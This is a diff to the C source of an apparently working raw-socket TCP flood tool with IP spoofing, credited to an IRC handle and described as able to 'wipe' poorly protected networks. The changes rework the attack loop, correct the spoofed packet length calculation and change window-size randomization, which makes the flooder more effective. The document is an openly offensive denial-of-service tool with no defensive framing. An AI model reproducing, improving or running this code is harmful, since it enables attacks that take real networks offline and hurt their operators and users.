@@ -54,7 +54,6 @@ By darkness@efnet. // greetz vae@efnet.
 #include <stdbool.h>
 
 // Code configuration, don't modify unless you know what you're doing!
-//#define DEBUG_TCP                                 // Debug various TCP related things, gives printed information when enabled.
 #define PHI                           0xedc12       // Number generation seed
 #define FLAGLIST_DIGITAL_GANGSTA      129           // Digital Gangsta Stomper,
 #define FLAGLIST_RAND_TCP             130           // Used to wipe basically any unprotected, or poorly configured protected networks.
@@ -347,27 +346,26 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
     xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr))  / 4;
 
-    // Calculate TCP checksum
-    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-
     // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
     memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
     memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
-#ifdef DEBUG_TCP
-    printf("> Pseudo HDR: %u\n", sizeof(struct ph));
-    printf("> IP HDR: %u\n", sizeof(struct ip));
-    printf("> TCP HDR: %u\n", sizeof(struct tcphdr2));
-    printf("> TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
-    printf("> Databytes: %u\n", databytes);
-    printf("> th_sum: %u\n", xf_tcphdr->th_sum);
-    printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-#else
-    printf("TCP Packet Size: %zu\n", sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-#endif
+    // Calculate TCP checksum
+    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
     while (true)
     {
+        // Core functionality
+        if (pktqueue != 0)
+            pktcount++;
+
+        // Attack timer
+        if (time(NULL) - start >= ttime)
+            handle_exit();
+
+        // Send our newly modified loop packet.
+        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
+
         // IP generation math
         if (sourceFullSpoof == true)
         {
@@ -459,11 +457,11 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         xf_iphdr->ip_id = htons(rand_cmwc());
 
         // Randomize winsize
-        if (winsize == 0)
+        if (winsize == 1)
         {
             xf_tcphdr->th_win = htons(((rand_cmwc() % TCP_WINDOW_SIZE_MAX) + TCP_WINDOW_SIZE_MIN));
         }
-        else if (winsize == 1)
+        else if (winsize == 2)
         {
             xf_tcphdr->th_win = htons(((rand_cmwc() > RAND_MAX / 2) ? 64800 : 64240));
         }
@@ -497,37 +495,18 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
             ps_tcphdr->th_sport = xf_tcphdr->th_sport;
         }
         // Calculate IP len
-        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr));
+        xf_iphdr->ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
         // Calculate TCP len and offset
         ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
         xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr)) / 4;
 
-        // Calculate TCP checksum
-        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
- 
         // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
         memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
         memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
-        #ifdef DEBUG_TCP
-        printf("> Loop Pseudo HDR: %u\n", sizeof(struct ph));
-        printf("> Loop IP HDR: %u\n", sizeof(struct ip));
-        printf("> Loop TCP HDR: %u\n", sizeof(struct tcphdr2));
-        printf("> Loop TCP OPTHDR: %u\n", sizeof(struct tcp_opthdr));
-        printf("> Loop Databytes: %u\n", databytes);
-        printf("> Loopth_sum: %u\n", xf_tcphdr->th_sum);
-        printf("> TCP Packet Size: %zu\n", sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
-        #endif
-
-        // Send packet.
-        sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
-
-        if (pktqueue != 0)
-            pktcount++;
-
-        if (time(NULL) - start >= ttime)
-            handle_exit();
+        // Calculate TCP checksum
+        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.ph, sizeof(struct ph) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
     }
 }
 
